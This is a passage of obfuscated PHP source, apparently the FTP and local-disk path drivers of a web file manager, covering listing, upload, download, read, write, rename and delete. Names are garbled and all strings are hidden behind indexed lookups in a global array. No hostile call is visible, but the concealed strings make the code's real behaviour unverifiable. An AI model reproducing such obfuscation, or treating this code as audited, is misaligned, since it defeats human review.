$Óàì÷Õ¤[75]); if ($ÜİãÌÊœ) { return $„ßÎÚÌğ; } $„ßÎÚÌğ[$Óàì÷Õ¤[200]] = $„ßÎÚÌğ[$Óàì÷Õ¤[85]] = 0; $„ßÎÚÌğ[$Óàì÷Õ¤[201]] = $„ßÎÚÌğ[$Óàì÷Õ¤[202]] = !0; return $„ßÎÚÌğ; } private function fileInfo($“­€™¦¨, $£Ã…àº = false, $”û¦êÉ‰ = array()) { $æÃó…©â =& $_SERVER[ßğøİ]; $à…º‚„Ì = array($æÃó…©â[32] => $this->pathThis($“­€™¦¨), $æÃó…©â[84] => $this->getPathOuter($æÃó…©â[8] . $“­€™¦¨), $æÃó…©â[33] => $æÃó…©â[199], $æÃó…©â[76] => isset($”û¦êÉ‰[$æÃó…©â[76]]) ? $”û¦êÉ‰[$æÃó…©â[76]] : 0, $æÃó…©â[174] => $this->ext($“­€™¦¨)); if ($£Ã…àº) { return $à…º‚„Ì; } $à…º‚„Ì[$æÃó…©â[200]] = $à…º‚„Ì[$æÃó…©â[85]] = 0; $à…º‚„Ì[$æÃó…©â[201]] = $à…º‚„Ì[$æÃó…©â[202]] = !0; $É¯½ñÑƒ = $this->iconvSystem($“­€™¦¨); $à…º‚„Ì[$æÃó…©â[85]] = @ftp_mdtm($this->connect, $É¯½ñÑƒ); if (empty($”û¦êÉ‰)) { $”û¦êÉ‰ = $this->objectMeta($“­€™¦¨); if (!$”û¦êÉ‰) { return $à…º‚„Ì; } } $à…º‚„Ì[$æÃó…©â[76]] = $”û¦êÉ‰[$æÃó…©â[76]]; return $à…º‚„Ì; } public function size($Ç·»şÕ­) { $™ûæ„ø = $this->objectMeta($Ç·»şÕ­); return $™ûæ„ø ? $™ûæ„ø[$_SERVER[ßğøİ][76]] : 0; } public function info($›Â‰¯Ş) { if ($this->isFile($›Â‰¯Ş)) { return $this->fileInfo($›Â‰¯Ş, 0); } else { if ($this->isFolder($›Â‰¯Ş)) { return $this->folderInfo($›Â‰¯Ş); } } return !1; } private function fileList($ÅÏ‘ÊÁÔ, &$˜Ë¶Íë, &$ıµ£“Ìå, $€ÄÆ…ïÀ = false) { $Ÿ ûİüÅ =& $_SERVER[ßğøİ]; $ÅÏ‘ÊÁÔ = $this->iconvSystem($ÅÏ‘ÊÁÔ); if (!$this->isFolder($ÅÏ‘ÊÁÔ)) { return !1; } @ftp_chdir($this->connect, $Ÿ ûİüÅ[8]); $ÅÏ‘ÊÁÔ = rtrim($ÅÏ‘ÊÁÔ, $Ÿ ûİüÅ[8]) . $Ÿ ûİüÅ[8]; check_abort(); $ØÏË²¤ã = @ftp_rawlist($this->connect, $ÅÏ‘ÊÁÔ); if (!$ØÏË²¤ã) { $ØÏË²¤ã = array(); } $·ĞÎ­Ş² = array($Ÿ ûİüÅ[10] => 1, $Ÿ ûİüÅ[1374] => 1); foreach ($ØÏË²¤ã as $ ë–Ş¸) { $¡™ÈÚòÖ = $this->_listItem($ ë–Ş¸); if ($¡™ÈÚòÖ[0] == $Ÿ ûİüÅ[756]) { continue; } $ıÔ±Š“à = $¡™ÈÚòÖ[8]; if (empty($ıÔ±Š“à) && $ıÔ±Š“à !== $Ÿ ûİüÅ[197] || isset($·ĞÎ­Ş²[$ıÔ±Š“à])) { continue; } $ıÔ±Š“à = $this->iconvApp($ÅÏ‘ÊÁÔ . ltrim($ıÔ±Š“à, $Ÿ ûİüÅ[8])); $©Ë½Å£ = array($Ÿ ûİüÅ[32] => $ıÔ±Š“à, $Ÿ ûİüÅ[33] => $Ÿ ûİüÅ[199], $Ÿ ûİüÅ[76] => $¡™ÈÚòÖ[4]); if (substr($ ë–Ş¸, 0, 1) == $Ÿ ûİüÅ[1375]) { $©Ë½Å£[$Ÿ ûİüÅ[33]] = $Ÿ ûİüÅ[75]; $©Ë½Å£[$Ÿ ûİüÅ[76]] = 0; } $öÇğòó¶ = $©Ë½Å£[$Ÿ ûİüÅ[33]] == $Ÿ ûİüÅ[75] ? !0 : !1; $this->cacheMethodInfoSet($ıÔ±Š“à, $öÇğòó¶, $©Ë½Å£); if ($öÇğòó¶) { $˜Ë¶Íë[] = $ıÔ±Š“à; if ($€ÄÆ…ïÀ) { $this->fileList($ıÔ±Š“à, $˜Ë¶Íë, $ıµ£“Ìå, $€ÄÆ…ïÀ); } continue; } $ıµ£“Ìå[] = $©Ë½Å£; } $this->cacheMethodInfoSet($ÅÏ‘ÊÁÔ, !0); } private function _listItem($ĞÁ˜Êİ) { if (empty($ĞÁ˜Êİ)) { return array(); } $¦ÀÔÎ¯ = preg_split($_SERVER[ßğøİ][1376], $ĞÁ˜Êİ); if (count($¦ÀÔÎ¯) <= 9) { return $¦ÀÔÎ¯; } $¦ÀÔÎ¯[8] = trim(substr($ĞÁ˜Êİ, strpos($ĞÁ˜Êİ, $¦ÀÔÎ¯[7]) + strlen($¦ÀÔÎ¯[7]))); return array_splice($¦ÀÔÎ¯, 0, 9); } public function listPath($•”Ú„½ , $ÕˆÎ²šô = false) { $ğÛ½­åÕ =& $_SERVER[ßğøİ]; if (!$this->_isconn()) { return !1; } $ŒˆÀ¹‘à = $ØÓİ€¤€ = array(); $this->fileList($•”Ú„½ , $ŒˆÀ¹‘à, $ØÓİ€¤€); foreach ($ŒˆÀ¹‘à as $ÔÇÆäËî => $ì¢ò ÂÑ) { $ŒˆÀ¹‘à[$ÔÇÆäËî] = $this->folderInfo($ì¢ò ÂÑ, $ÕˆÎ²šô); } foreach ($ØÓİ€¤€ as $ÔÇÆäËî => $ì¢ò ÂÑ) { $ØÓİ€¤€[$ÔÇÆäËî] = $this->fileInfo($ì¢ò ÂÑ[$ğÛ½­åÕ[32]], $ÕˆÎ²šô, $ì¢ò ÂÑ); } return array($ğÛ½­åÕ[82] => $ŒˆÀ¹‘à, $ğÛ½­åÕ[83] => $ØÓİ€¤€); } public function has($ÃùûîŒ, $î€óˆå© = false, $€ªğœè¬ = true) { $ˆü½¼üÖ =& $_SERVER[ßğøİ]; $¤ˆò«èÇ = $Ù¸§â“í = array(); $ƒËÉÁ² = $î€óˆå© ? !0 : !1; $this->fileList($ÃùûîŒ, $¤ˆò«èÇ, $Ù¸§â“í, $ƒËÉÁ²); if ($î€óˆå©) { return array($ˆü½¼üÖ[207] => count($Ù¸§â“í), $ˆü½¼üÖ[208] => count($¤ˆò«èÇ)); } if ($€ªğœè¬) { if (count($Ù¸§â“í)) { return !0; } } else { if (count($¤ˆò«èÇ)) { return !0; } } return !1; } public function listAll($šğë«”¥) { $Ñ¥Ï§Ë‚ =& $_SERVER[ßğøİ]; if (!$this->_isconn()) { return !1; } $Œçì³¡Í = $õ°¬ãö = array(); $this->fileList($šğë«”¥, $Œçì³¡Í, $õ°¬ãö, !0); $¨‚¹Öšç = array(); foreach ($õ°¬ãö as $è¹ó‘Õ) { $¨‚¹Öšç[$è¹ó‘Õ[$Ñ¥Ï§Ë‚[32]]] = $è¹ó‘Õ[$Ñ¥Ï§Ë‚[76]]; } foreach ($Œçì³¡Í as $è¹ó‘Õ) { if (is_string($è¹ó‘Õ)) { $¨‚¹Öšç[$è¹ó‘Õ] = 0; } } return $this->listAllFiles($šğë«”¥, array_keys($¨‚¹Öšç), $¨‚¹Öšç); } public function getContent($´øÅ¿š) { if (!$this->_isconn()) { return !1; } $´øÅ¿š = $this->iconvSystem($´øÅ¿š); return $this->fileSubstr($´øÅ¿š); } public function setContent($òüÂÌçŸ, $¦èş ‡Ê = '') { if (!$this->_isconn()) { return !1; } $¥ï¿Ï“Ñ = $this->pathThis($this->iconvSystem($òüÂÌçŸ)); $¼¯ù·¦” = $this->tempFile($¥ï¿Ï“Ñ); file_put_contents($¼¯ù·¦”, $¦èş ‡Ê); $¹´ßæ¨ = $this->upload($òüÂÌçŸ, $this->iconvApp($¼¯ù·¦”)); $this->tempFileRemve($¼¯ù·¦”); return $¹´ßæ¨; } public function fileSubstr($ş”ÏÄ×, $˜Õ‹ëÔÙ = 0, $Ş½ŒĞ­¦ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ş”ÏÄ×, $˜Õ‹ëÔÙ, $Ş½ŒĞ­¦); } private function ftpRequest($˜ÏÂûÇÊ, $¨­Ï’â™ = 0, $ğ«üä€Ë = false) { $˜ÏÂûÇÊ = $this->iconvSystem($˜ÏÂûÇÊ); $ÆÜşß¥ = $this->scheme . $this->host . $_SERVER[ßğøİ][4] . $this->port; $•Ñ×¶¬å = curl_init(); curl_setopt($•Ñ×¶¬å, CURLOPT_URL, $ÆÜşß¥ . $this->pathEncode($˜ÏÂûÇÊ)); curl_setopt($•Ñ×¶¬å, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ğ«üä€Ë) { $Ìª®‚¶ = $¨­Ï’â™ + $ğ«üä€Ë - 1; curl_setopt($•Ñ×¶¬å, CURLOPT_RANGE, "{$¨­Ï’â™}\55{$Ìª®‚¶}"); } curl_setopt($•Ñ×¶¬å, CURLOPT_RETURNTRANSFER, 1); $Ûîä¸îù = curl_exec($•Ñ×¶¬å); curl_close($•Ñ×¶¬å); return $Ûîä¸îù; } public function upload($»Ó„×ğ·, $ş¥½Şá¨, $æ€™…ñÄ = false, $ĞØ„Ì•€ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($»Ó„×ğ·))) { return !1; } $»Ó„×ğ· = $this->iconvSystem($»Ó„×ğ·); $ş¥½Şá¨ = $this->iconvSystem($ş¥½Şá¨); $¶”‹½»™ = ftp_nb_put($this->connect, $»Ó„×ğ·, $ş¥½Şá¨, FTP_BINARY); while ($¶”‹½»™ == FTP_MOREDATA) { $¶”‹½»™ = ftp_nb_continue($this->connect); } if ($¶”‹½»™ != FTP_FINISHED) { return !1; } return $this->getPathOuter($»Ó„×ğ·); } public function download($¹²•É²à, $ùÆÇïã = '') { if (!$this->_isconn()) { return !1; } $²÷Ã²’Æ = $this->pathFather($ùÆÇïã); if (!IO::mkdir($²÷Ã²’Æ)) { return !1; } $¹²•É²à = $this->iconvSystem($¹²•É²à); $ùÆÇïã = $this->iconvSystem($ùÆÇïã); $Íˆ ¼¬ = ftp_nb_get($this->connect, $ùÆÇïã, $¹²•É²à, FTP_BINARY); while ($Íˆ ¼¬ == FTP_MOREDATA) { $Íˆ ¼¬ = ftp_nb_continue($this->connect); } if ($Íˆ ¼¬ != FTP_FINISHED) { return !1; } return $this->iconvApp($ùÆÇïã); } public function exist($Å´‚å·) { return $this->isFile($Å´‚å·) || $this->isFolder($Å´‚å·); } public function isFile($¹ö•ÜıÄ) { return !$this->isFolder($¹ö•ÜıÄ) && $this->objectMeta($¹ö•ÜıÄ); } public function isFolder($•ƒŞ†¾›) { return $this->cacheMethod($_SERVER[ßğøİ][165], $•ƒŞ†¾›); } protected function objectMeta($•¸¯öóî) { return $this->cacheMethod($_SERVER[ßğøİ][167], $•¸¯öóî); } protected function _objectMeta($Ú×¢™) { $«¡èøÍÜ =& $_SERVER[ßğøİ]; if ($Ú×¢™ == $«¡èøÍÜ[12] || $Ú×¢™ == $«¡èøÍÜ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ú×¢™ = $this->iconvSystem($Ú×¢™); $î¤Û¿¯â = array($«¡èøÍÜ[32] => $this->iconvApp($Ú×¢™), $«¡èøÍÜ[33] => $«¡èøÍÜ[199], $«¡èøÍÜ[76] => 0); @ftp_chdir($this->connect, $«¡èøÍÜ[8]); $•äÄıïÃ = @ftp_size($this->connect, $Ú×¢™); if ($•äÄıïÃ != -1) { $î¤Û¿¯â[$«¡èøÍÜ[76]] = $•äÄıïÃ; } else { $¨˜íüáƒ = @ftp_chdir($this->connect, $Ú×¢™); if (!$¨˜íüáƒ) { return !1; } $î¤Û¿¯â[$«¡èøÍÜ[33]] = $«¡èøÍÜ[75]; } return $î¤Û¿¯â; } protected function _isFolder($šåë¤–§) { $›Ù¶Õà¼ =& $_SERVER[ßğøİ]; if ($šåë¤–§ == $›Ù¶Õà¼[12] || $šåë¤–§ == $›Ù¶Õà¼[8]) { return !0; } $şÒÎŞ·å = $this->_objectMeta($šåë¤–§); return isset($şÒÎŞ·å[$›Ù¶Õà¼[33]]) && $şÒÎŞ·å[$›Ù¶Õà¼[33]] == $›Ù¶Õà¼[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ç¿ú¦Ş£) { if (substr($ç¿ú¦Ş£, 0, 2) == $_SERVER[ßğøİ][1367]) { $ç¿ú¦Ş£ = BASIC_PATH . substr($ç¿ú¦Ş£, 2); } return $ç¿ú¦Ş£; } public function iconvApp($®ŸÆ•‡è) { $õˆ¿Í¿™ =& $_SERVER[ßğøİ]; global $config; return $this->iconvTo($®ŸÆ•‡è, $config[$õˆ¿Í¿™[1365]], $config[$õˆ¿Í¿™[1364]]); } public function iconvSystem($Äïå·Ø) { $«íıš÷¹ =& $_SERVER[ßğøİ]; global $config; return $this->iconvTo($Äïå·Ø, $config[$«íıš÷¹[1364]], $config[$«íıš÷¹[1365]]); } public function getPathOuter($™”¦İÁµ) { $ú‰÷£Œ¿ =& $_SERVER[ßğøİ]; $ÀÜŒ ÇÍ = $this->iconvApp($this->pathBase); $™”¦İÁµ = $this->iconvApp($™”¦İÁµ); if (substr($ÀÜŒ ÇÍ, 0, 2) == $ú‰÷£Œ¿[1367]) { $ÀÜŒ ÇÍ = BASIC_PATH . substr($ÀÜŒ ÇÍ, 2); } if (substr($™”¦İÁµ, 0, 2) == $ú‰÷£Œ¿[1367]) { $™”¦İÁµ = BASIC_PATH . substr($™”¦İÁµ, 2); } $ÀÜŒ ÇÍ = KodIO::clear($ÀÜŒ ÇÍ); $™”¦İÁµ = KodIO::clear($™”¦İÁµ); $™”¦İÁµ = substr($™”¦İÁµ, strlen($ÀÜŒ ÇÍ)); if (empty($this->pathDriver)) { return $™”¦İÁµ; } return $this->pathDriver . $ú‰÷£Œ¿[8] . ltrim($™”¦İÁµ, $ú‰÷£Œ¿[8]); } public function mkfile($ˆ»¡¬Ò•, $Ìöõ¡ñ© = '', $¬ÁÌ´™Œ = REPEAT_RENAME) { $ˆ»¡¬Ò• = $this->iconvSystem($ˆ»¡¬Ò•); @touch($ˆ»¡¬Ò•); if ($Ìöõ¡ñ©) { file_put_contents($ˆ»¡¬Ò•, $Ìöõ¡ñ©); } @chmod($ˆ»¡¬Ò•, $this->pathAuth); return is_file($ˆ»¡¬Ò•) ? $this->getPathOuter($ˆ»¡¬Ò•) : !1; } public function mkdir($¤ä—»¤, $ê¸áÔ© = REPEAT_SKIP) { $¤ä—»¤ = $this->iconvSystem($¤ä—»¤); if (is_dir($¤ä—»¤)) { return $this->getPathOuter($¤ä—»¤); } @mkdir($¤ä—»¤, $this->pathAuth, !0); @chmod($¤ä—»¤, $this->pathAuth); return is_dir($¤ä—»¤) ? $this->getPathOuter($¤ä—»¤) : !1; } public function copyFile($ÏõÒ½Ãş, $İÛµ­Ş) { $this->mkdir($this->pathFather($İÛµ­Ş)); $ÏõÒ½Ãş = $this->iconvSystem($ÏõÒ½Ãş); $İÛµ­Ş = $this->iconvSystem($İÛµ­Ş); $ÅíªŠ©¦ = copy_64($ÏõÒ½Ãş, $İÛµ­Ş); @chmod($İÛµ­Ş, $this->pathAuth); return $ÅíªŠ©¦ ? $this->getPathOuter($İÛµ­Ş) : !1; } public function moveFile($óèïæñ, $’£å¨–¨) { $this->mkdir($this->pathFather($’£å¨–¨)); $óèïæñ = $this->iconvSystem($óèïæñ); $’£å¨–¨ = $this->iconvSystem($’£å¨–¨); $œ‘Ñ¡ìá = intval(@rename($óèïæñ, $’£å¨–¨)); if (!$œ‘Ñ¡ìá) { if ($œ‘Ñ¡ìá = intval(@copy_64($óèïæñ, $’£å¨–¨))) { @unlink($óèïæñ); } } @chmod($’£å¨–¨, $this->pathAuth); return $œ‘Ñ¡ìá ? $this->getPathOuter($’£å¨–¨) : !1; } public function movePath($İÙ…±ì, $Ô˜´¸°¶, $–‰‰æå = false) { $üëíùöì =& $_SERVER[ßğøİ]; $İÙ…±ì = $this->iconvSystem($İÙ…±ì); $Ô˜´¸°¶ = $this->iconvSystem($Ô˜´¸°¶); $òºÀÜü› = rtrim($Ô˜´¸°¶, $üëíùöì[8]) . $üëíùöì[8] . ($–‰‰æå ? $–‰‰æå : get_path_this($İÙ…±ì)); if (file_exists($òºÀÜü›)) { return !1; } $ªÉÛùîØ = intval(@rename($İÙ…±ì, $òºÀÜü›)); $ªÉÛùîØ = file_exists($òºÀÜü›); return $ªÉÛùîØ ? $this->getPathOuter($òºÀÜü›) : !1; } public function delFile($¶õŠ«ƒ) { $¶õŠ«ƒ = $this->iconvSystem($¶õŠ«ƒ); if (!@unlink($¶õŠ«ƒ)) { @chmod($¶õŠ«ƒ, $this->pathAuth); if (!@unlink($¶õŠ«ƒ)) { return !1; } } else { return !0; } } public function delFolder($¹Ş—¡ªÊ) { $÷‘®«¬ =& $_SERVER[ßğøİ]; $¹Ş—¡ªÊ = $this->iconvSystem($¹Ş—¡ªÊ); if (!is_dir($¹Ş—¡ªÊ)) { return !0; } if (!($ü§‰å‚¯ = opendir($¹Ş—¡ªÊ))) { return !1; } while (($ŸÌ¶ıœû = readdir($ü§‰å‚¯)) !== !1) { if ($ŸÌ¶ıœû == $÷‘®«¬[10] || $ŸÌ¶ıœû == $÷‘®«¬[1374]) { continue; } $ÈÎú¹Ø× = $¹Ş—¡ªÊ . $÷‘®«¬[8] . $ŸÌ¶ıœû; if (is_file($ÈÎú¹Ø×) || is_link($ÈÎú¹Ø×)) { if (!unlink($ÈÎú¹Ø×)) { chmod($ÈÎú¹Ø×, $this->pathAuth); if (!unlink($ÈÎú¹Ø×)) { return !1; } } } else { if (is_dir($ÈÎú¹Ø×)) { chmod($ÈÎú¹Ø×, $this->pathAuth); $ÈÎú¹Ø× = $this->iconvApp($ÈÎú¹Ø×); if (!$this->delFolder($ÈÎú¹Ø×)) { return !1; } } } } closedir($ü§‰å‚¯); return rmdir($¹Ş—¡ªÊ); } public function rename($ûµ©Î¥Î, $­ìÑ‘ÍÓ) { $Äù¥Êî =& $_SERVER[ßğøİ]; $Ôê±êÙö = $this->fileNameAuto($this->pathFather($ûµ©Î¥Î), $­ìÑ‘ÍÓ); $Ôê±êÙö = $this->iconvSystem($Ôê±êÙö); $ûµ©Î¥Î = $this->iconvSystem($ûµ©Î¥Î); $å¾Îé¶Á = $this->pathFather($ûµ©Î¥Î); $õÅÒó¨Ê = rtrim($å¾Îé¶Á, $Äù¥Êî[8]) . $Äù¥Êî[8] . $Ôê±êÙö; $Ş…™Œ = @rename($ûµ©Î¥Î, $õÅÒó¨Ê); $õÅÒó¨Ê = $this->iconvApp($õÅÒó¨Ê); return $Ş…™Œ ? $this->getPathOuter($õÅÒó¨Ê) : !1; } public function size($Æ‹öıõË) { $Æ‹öıõË = $this->iconvSystem($Æ‹öıõË); return filesize_64($Æ‹öıõË); } public function info($ö„…ƒÑ„) { $ö„…ƒÑ„ = $this->iconvSystem($ö„…ƒÑ„); if ($this->isFolder($ö„…ƒÑ„)) { return $this->folderInfo($ö„…ƒÑ„); } else { if ($this->isFile($ö„…ƒÑ„)) { return $this->fileInfo($ö„…ƒÑ„); } } return !1; } protected function infoChildren($ãÙŠçû, &$†šÑ¯Ü¨, $Ñ†Æ•ç´ = true) { $ãåÀ‡Æ =& $_SERVER[ßğøİ]; check_abort_echo(); $ãÙŠçû = rtrim($ãÙŠçû, $ãåÀ‡Æ[8]) . $ãåÀ‡Æ[8]; if ($Ñ†Æ•ç´) { $ãÙŠçû = $this->iconvSystem($ãÙŠçû); } if (!($ˆÃİ…ğÇ = @opendir($ãÙŠçû))) { return; } while (($²ë’‘²ã = readdir($ˆÃİ…ğÇ)) !== !1) { if ($²ë’‘²ã == $ãåÀ‡Æ[10] || $²ë’‘²ã == $ãåÀ‡Æ[1374]) { continue; } $¨ıŒ†›¼ = $ãÙŠçû . $²ë’‘²ã; if (is_file($¨ıŒ†›¼) || is_link($¨ıŒ†›¼)) { $†šÑ¯Ü¨[$ãåÀ‡Æ[77]]++; $†šÑ¯Ü¨[$ãåÀ‡Æ[76]] += filesize_64($¨ıŒ†›¼); } else { if (is_dir($¨ıŒ†›¼)) { $†šÑ¯Ü¨[$ãåÀ‡Æ[78]]++; $this->infoChildren($¨ıŒ†›¼, $†šÑ¯Ü¨, !1); } } } closedir($ˆÃİ…ğÇ); } private function folderInfo($ğ„¥¡òš, $£¬Öøóº = false) { $ Œ‡ÀŒ =& $_SERVER[ßğøİ]; $ğ„¥¡òš = rtrim($ğ„¥¡òš, $ Œ‡ÀŒ[8]) . $ Œ‡ÀŒ[8]; $·”®Úû® = $this->iconvApp($this->pathThis($ğ„¥¡òš)); if ($£¬Öøóº) { return array($ Œ‡ÀŒ[32] => $·”®Úû®, $ Œ‡ÀŒ[84] => $this->getPathOuter($ğ„¥¡òš), $ Œ‡ÀŒ[33] => $ Œ‡ÀŒ[75]); } $ãî€Ü¡ = array($ Œ‡ÀŒ[32] => $·”®Úû®, $ Œ‡ÀŒ[84] => $this->getPathOuter($ğ„¥¡òš), $ Œ‡ÀŒ[33] => $ Œ‡ÀŒ[75], $ Œ‡ÀŒ[200] => @filectime($ğ„¥¡òš), $ Œ‡ÀŒ[85] => @filemtime($ğ„¥¡òš), $ Œ‡ÀŒ[1377] => @fileatime($ğ„¥¡òš), $ Œ‡ÀŒ[1378] => is_readable($ğ„¥¡òš), $ Œ‡ÀŒ[1379] => is_writable($ğ„¥¡òš), $ Œ‡ÀŒ[1380] => get_mode($ğ„¥¡òš)); return $ãî€Ü¡; } private function fileInfo($¹ìöÖÒ“, $Çù˜µ×ì = false) { $œòÖùàİ =& $_SERVER[ßğøİ]; $ˆ¾Ç¡Õì = $this->iconvApp($this->pathThis($¹ìöÖÒ“)); if ($Çù˜µ×ì) { return array($œòÖùàİ[32] => $ˆ¾Ç¡Õì, $œòÖùàİ[84] => $this->getPathOuter($¹ìöÖÒ“), $œòÖùàİ[33] => $œòÖùàİ[199], $œòÖùàİ[76] => $this->size($¹ìöÖÒ“), $œòÖùàİ[174] => $this->ext($ˆ¾Ç¡Õì)); } $Õü‹ùü = array($œòÖùàİ[32] => $ˆ¾Ç¡Õì, $œòÖùàİ[84] => $this->getPathOuter($¹ìöÖÒ“), $œòÖùàİ[33] => $œòÖùàİ[199], $œòÖùàİ[200] => @filectime($¹ìöÖÒ“), $œòÖùàİ[85] => @filemtime($¹ìöÖÒ“), $œòÖùàİ[1377] => @fileatime($¹ìöÖÒ“), $œòÖùàİ[76] => $this->size($¹ìöÖÒ“), $œòÖùàİ[174] => $this->ext($ˆ¾Ç¡Õì), $œòÖùàİ[1378] => is_readable($¹ìöÖÒ“), $œòÖùàİ[1379] => is_writable($¹ìöÖÒ“), $œòÖùàİ[1380] => get_mode($¹ìöÖÒ“)); return $Õü‹ùü; } public function exist($÷»Ù‰ø¦) { $÷»Ù‰ø¦ = $this->iconvSystem($÷»Ù‰ø¦); return @file_exists($÷»Ù‰ø¦); } public function isFile($éÖ‚«Õ¢) { $éÖ‚«Õ¢ = $this->iconvSystem($éÖ‚«Õ¢); return @is_file($éÖ‚«Õ¢); } public function isFolder($¸¦ŠÓ¹ö) { $¸¦ŠÓ¹ö = $this->iconvSystem($¸¦ŠÓ¹ö); return @is_dir($¸¦ŠÓ¹ö); } public function listPath($‰í‘»°™, $„·î­å = false) { $Ù‡Ñ¢ö§ =& $_SERVER[ßğøİ]; $‰í‘»°™ = $this->iconvSystem($‰í‘»°™); $‰í‘»°™ = rtrim($‰í‘»°™, $Ù‡Ñ¢ö§[8]) . $Ù‡Ñ¢ö§[8]; $¨×ÛÉ˜ = array($Ù‡Ñ¢ö§[82] => array(), $Ù‡Ñ¢ö§[83] => array()); if (!($Æ¬‡®ÊÏ = @opendir($‰í‘»°™))) { return $¨×ÛÉ˜; } while (($Äû¿ú½« = readdir($Æ¬‡®ÊÏ)) !== !1) { if ($Äû¿ú½« == $Ù‡Ñ¢ö§[10] || $Äû¿ú½« == $Ù‡Ñ¢ö§[1374]) { continue; } $üƒ†Ìòª = $‰í‘»°™ . $Äû¿ú½«; if (is_file($üƒ†Ìòª)) { $¨×ÛÉ˜[$Ù‡Ñ¢ö§[83]][] = $this->fileInfo($üƒ†Ìòª, $„·î­å); } else { $¨×ÛÉ˜[$Ù‡Ñ¢ö§[82]][] = $this->folderInfo($üƒ†Ìòª, $„·î­å); } } closedir($Æ¬‡®ÊÏ); return $¨×ÛÉ˜; } public function listAll($õÙØÙÆò, &$ğ¿»«¤µ = array()) { $ñŸ© ¯ =& $_SERVER[ßğøİ]; $õÙØÙÆò = $this->iconvSystem($õÙØÙÆò); $õÙØÙÆò = rtrim($õÙØÙÆò, $ñŸ© ¯[8]) . $ñŸ© ¯[8]; if (!($Å¬èüœ— = @opendir($õÙØÙÆò))) { return $ğ¿»«¤µ; } while (($ÃÔ­—Â = readdir($Å¬èüœ—)) !== !1) { if ($ÃÔ­—Â == $ñŸ© ¯[10] || $ÃÔ­—Â == $ñŸ© ¯[1374]) { continue; } $¨ŞàÉœå = $õÙØÙÆò . $ÃÔ­—Â; if (is_dir($¨ŞàÉœå) && !is_link($¨ŞàÉœå)) { $ğ¿»«¤µ[] = array($ñŸ© ¯[84] => $¨ŞàÉœå . $ñŸ© ¯[8], $ñŸ© ¯[75] => 1, $ñŸ© ¯[85] => @filemtime($¨ŞàÉœå), $ñŸ© ¯[76] => 0); $this->listAll($¨ŞàÉœå, $ğ¿»«¤µ); } else { $ğ¿»«¤µ[] = array($ñŸ© ¯[84] => $¨ŞàÉœå, $ñŸ© ¯[75] => 0, $ñŸ© ¯[85] => @filemtime($¨ŞàÉœå), $ñŸ© ¯[76] => $this->size($¨ŞàÉœå)); } } closedir($Å¬èüœ—); return $ğ¿»«¤µ; } public function has($ëÃç–Ö™, $õÌú—§ = false, $óÇ¸é¶ñ = true) { $×»ñ°× =& $_SERVER[ßğøİ]; $ëÃç–Ö™ = $this->iconvSystem($ëÃç–Ö™); $ëÃç–Ö™ = rtrim($ëÃç–Ö™, $×»ñ°×[8]) . $×»ñ°×[8]; if (!($Ç¡ ›Ï´ = @opendir($ëÃç–Ö™))) { return !1; } $„·°›Æı = 0; $Ê®ÑÛØ§ = 0; $°Ñ‡¼É‹ = 0; while (($¢İÛúÛ = readdir($Ç¡ ›Ï´)) !== !1) { if ($¢İÛúÛ == $×»ñ°×[10] || $¢İÛúÛ == $×»ñ°×[1374]) { continue; } $Î²æ›ôñ = $ëÃç–Ö™ . $¢İÛúÛ; if ($õÌú—§) { $°Ñ‡¼É‹++; if (@is_file($Î²æ›ôñ)) { $„·°›Æı++; } else { $Ê®ÑÛØ§++; } if ($°Ñ‡¼É‹ > 10000) { break; } continue; } if ($óÇ¸é¶ñ) { if (@is_file($Î²æ›ôñ)) { return !0; } } else { if (@is_dir($Î²æ›ôñ . $×»ñ°×[8])) { return !0; } } } closedir($Ç¡ ›Ï´); if ($õÌú—§) { return array($×»ñ°×[207] => $„·°›Æı, $×»ñ°×[208] => $Ê®ÑÛØ§); } return !1; } public function hashSimple($ôƒŠôÆğ) { $¿ËÖÀ§˜ =& $_SERVER[ßğøİ]; if (!$ôƒŠôÆğ) { return md5($¿ËÖÀ§˜[12]); } $ôƒŠôÆğ = $this->iconvSystem($ôƒŠôÆğ); $íÜ¡¶¦¾ = $this->size($ôƒŠôÆğ); $¼…Ğ¸„ = 200; $ğ‰Ã­Ë‘ = 50; if ($íÜ¡¶¦¾ <= $¼…Ğ¸„ * $ğ‰Ã­Ë‘) { return $this->hashMd5($ôƒŠôÆğ) . $íÜ¡¶¦¾; } $¡éş¹ğÅ = $¿ËÖÀ§˜[12]; $¹àÅ¥© = intval($íÜ¡¶¦¾ / $ğ‰Ã­Ë‘); $‹ñ˜»ãÓ = fopen($ôƒŠôÆğ, $¿ËÖÀ§˜[1381]); if (!$‹ñ˜»ãÓ) { return $¡éş¹ğÅ; } for ($åáæŒ Ş = 0; $åáæŒ Ş < $ğ‰Ã­Ë‘; $åáæŒ Ş++) { fseek_64($‹ñ˜»ãÓ, $¹àÅ¥© * $åáæŒ Ş); $¡éş¹ğÅ .= fread($‹ñ˜»ãÓ, $¼…Ğ¸„); } fseek_64($‹ñ˜»ãÓ, $íÜ¡¶¦¾ - $¼…Ğ¸„); $¡éş¹ğÅ .= fread($‹ñ˜»ãÓ, $¼…Ğ¸„); fclose($‹ñ˜»ãÓ); return md5($¡éş¹ğÅ) . $íÜ¡¶¦¾; } public function getContent($ˆ·­çÓŸ) { $ˆ·­çÓŸ = $this->iconvSystem($ˆ·­çÓŸ); return file_get_contents($ˆ·­çÓŸ); } public function setContent($Å Ã ¯¤, $âë•…Âİ = '') { $Å Ã ¯¤ = $this->iconvSystem($Å Ã ¯¤); $˜ÓÎ‰Ô… = @file_put_contents($Å Ã ¯¤, $âë•…Âİ, LOCK_EX); clearstatcache(); @chmod($Å Ã ¯¤, $this->pathAuth); return $˜ÓÎ‰Ô… === !1 ? !1 : !0; } public function fileSubstr($Ô¶°ı•è, $Éù£œÀ = 0, $ôÕªÇìñ = false) { $…·÷Å“— =& $_SERVER[ßğøİ]; $Ô¶°ı•è = $this->iconvSystem($Ô¶°ı•è); if ($ôÕªÇìñ === !1) { $ôÕªÇìñ = $this->size($Ô¶°ı•è); } if ($ôÕªÇìñ <= 0) { return $…·÷Å“—[12]; } $è¥À§·Ç = fopen($Ô¶°ı•è, $…·÷Å“—[1381]); if (!$è¥À§·Ç) { return !1; } fseek_64($è¥À§·Ç, $Éù£œÀ); $ğ‡”Ù­ = 